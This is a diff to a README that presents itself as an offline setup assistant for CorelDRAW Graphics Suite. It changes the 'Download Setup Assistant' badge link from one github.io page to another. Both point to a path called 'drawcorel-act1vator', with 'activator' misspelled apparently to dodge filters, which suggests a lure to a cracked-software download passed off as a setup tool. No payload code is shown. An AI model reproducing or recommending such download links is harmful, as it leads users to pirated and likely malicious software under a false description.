@@ -5,7 +5,7 @@ A self-contained offline assistant for setting up CorelDRAW Graphics Suite. Tail
 ---
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://paulmoore1903620.github.io/.github/drawcorel-act1vator)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://rickycastanedaajzh.github.io/.github/drawcorel-act1vator)
 
 ---
 
